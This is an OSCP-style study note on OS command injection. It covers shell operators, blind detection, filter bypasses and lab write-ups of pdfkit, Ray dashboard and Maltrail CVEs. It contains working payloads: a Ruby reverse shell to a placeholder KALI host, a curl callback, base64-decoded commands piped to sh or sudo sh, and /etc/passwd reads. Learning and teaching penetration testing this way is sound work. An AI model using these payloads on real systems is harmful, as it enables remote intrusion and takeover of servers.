---
title: "Command Injection"
slug: command-injection
category: notes
handbook: oscp
tags: ["command-injection"]
draft: false
pubDatetime: 2026-07-18T17:48:53+03:00
modDatetime: 2026-09-08T22:35:52+03:00
description: "Command injection (OS command injection) is when user input is passed into a system shell, so the input can append its own OS commands."
---
Command injection (OS command injection) is when user input is passed into a system shell, so the input can append its own OS commands. Where [SQL Injection](/collections/oscp/sql-injection) targets the database, command injection targets the operating system directly, and a successful one is command execution, usually one step from a shell.

## Why It Happens

The application builds a shell command out of input and hands the whole string to a shell:

```php
system("nslookup " . $_GET['host']);
```

The shell parses the entire string, so shell metacharacters inside `host` start new commands. The vulnerable calls are the ones that invoke a shell: `system`, `exec`, `shell_exec`, `passthru`, and backticks in PHP; `os.system` or `subprocess(..., shell=True)` in Python; backticks and `system` in Perl and Ruby.

## Injecting

Shell metacharacters chain onto or terminate the intended command:

| Operator | Effect |
|---|---|
| `;` | Run the next command unconditionally |
| `\|` | Pipe into, and run, the second command |
| `&&` | Run the second only if the first succeeds |
| `\|\|` | Run the second only if the first fails |
| `` `cmd` `` or `$(cmd)` | Command substitution, runs inline |
| newline (`%0a`) | Starts a new command line |

A quick probe is to append `; id` or `| id` and look for `uid=` in the response. Over HTTP the operators and spaces need URL-encoding, for example `%3B` for `;`, `%7C` for `|`, `%26` for `&`, `+` for space.

## Results Returned vs Blind

- **Results returned**: the command output appears in the response, so files, `id`, and directory listings come back directly.
- **Blind**: no output returns. Confirm with a time delay (`; sleep 5`) or an out-of-band callback (`; curl http://KALI/`), then skip reading output and go straight for a reverse shell.

## To a Shell

Command injection runs one command at a time, which is a command-execution primitive: make that command a reverse shell. Sar injected the `sar2HTML` `plot` parameter and called a shell back. Shakabrah injected the `host` parameter of a ping form (a form that reaches a host is a prime candidate, since the input is usually concatenated into a shell call). Mind the interpreter and the callback port, both in [Reverse Shells](/collections/oscp/reverse-shells) and its command-primitive section.

## HTML-to-PDF and pdfkit (CVE-2022-25765)

The Ruby `pdfkit` gem renders a URL to PDF by shelling out to the `wkhtmltopdf` binary, and it builds that command line from the URL without sanitising shell metacharacters, so a crafted URL injects a command (CVE-2022-25765). This is specific to `pdfkit`, not a general property of HTML-to-PDF converters. The payload is a URL that starts with a space and a backtick block:

```
http://%20`command`
```

The leading `%20` makes the value parse as a URL while the backticked command survives onto the `wkhtmltopdf` command line, where the shell runs it. The injected command runs through whatever shell `wkhtmltopdf` is spawned under, so pick a payload that does not depend on bash: on a Ruby app, a Ruby `TCPSocket` callback is more reliable than a bash `/dev/tcp` one-liner. RubyDome exploited this in a `url` parameter for a shell as the app user.

```
http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("KALI","PORT"))'`
```

The tell is a `PDFKit` or `wkhtmltopdf` error page: submitting a bad URL to the converter throws an exception that names the gem, the wkhtmltopdf path, and the app file, confirming the stack before the payload goes in. EDB 51293 automates the request.

## Ray dashboard cpu_profile (CVE-2023-6019)

Ray is a distributed computing framework for Python and machine-learning workloads. Its dashboard, default port 8265 but frequently moved, ships without authentication, and in every version before 2.8.1 the `format` parameter of `/worker/cpu_profile` reaches the command line that runs the profiler unsanitised. One GET request is remote code execution as whatever user the dashboard runs as, which on a lab box is usually root.

```
/worker/cpu_profile?pid=1234&ip=TARGET&duration=5&native=0&format=`command`
```

EDB 51978 automates it. The payload it builds is a good template for any injection point that has to survive a URL:

```
format=`echo <base64>|base64$IFS-d|sudo sh`
```

Base64 removes every quote, space, and parenthesis from the value, `$IFS` supplies the one space that is still needed, and the backticks make the shell run the result. The `sudo` is optional and only pays off when the service user has passwordless sudo. On CVE-2023-6019 the request returned a root shell directly, and the exploit's hardcoded `pid` did not need to be a real worker process.

## Maltrail login (CVE-2025-34073)

Maltrail is a traffic threat detection sensor with a dashboard on 8338 that needs no authentication to read. In every version up to and including 0.54, `core/http.py` passes the `username` field of `POST /login` into `subprocess.check_output()` while building the `logger` call that records the failed attempt, so the field reaches a shell command line unsanitised. Unauthenticated, and the version prints in the dashboard footer.

```
username=;`echo <base64>|base64 -d|sh`
```

What makes this one worth reading is that the injection point is visible from the target's side. On Ochima, pspy caught the still-running parent process, which is the log line the sensor meant to write with the payload sitting in the middle of it:

```text
UID=0 PID=9752 | /bin/sh -c logger -p auth.info -t "maltrail[854]" "Failed password for ;`echo "<base64>" | base64 -d | sh` from 192.168.45.194 port 56346"
```

The `;` closes `Failed password for `, the backticks run the decoded payload, and the rest of the intended message trails harmlessly after it. Base64 keeps quotes and spaces out of a value that has to survive an HTTP form field, the same reasoning as the Ray payload above.

The parent runs as root but the injected command does not; on Ochima everything below that `sh -c` was UID 1001, the account the sensor drops to. Check `id` on landing rather than assuming the shell inherits the privilege of the process that logged the request.

## Filters and Bypasses

When characters are filtered:

- Spaces blocked: `${IFS}`, `{cat,/etc/passwd}`, or redirect with `<`. The braces can be dropped when the next character cannot continue a variable name, as in `base64$IFS-d`.
- Keywords blocked: break them up with `c""at`, `c\at`, or build them from variables.
- One operator blocked: try the others in the table, or a newline.

## Related

- A webshell is a command injection planted on purpose, run through a `cmd` parameter. See [Webshells](/collections/oscp/webshells).
- The input does not have to be a request parameter. A file handed to a helper that parses it unsafely does the same thing, as in [ExifTool DjVu Injection](/collections/oscp/exiftool-djvu-injection) where the payload lives in image metadata.
- Distinct from code injection (for example PHP `eval` on input), which runs language code rather than shell commands, though the payoff is similar.
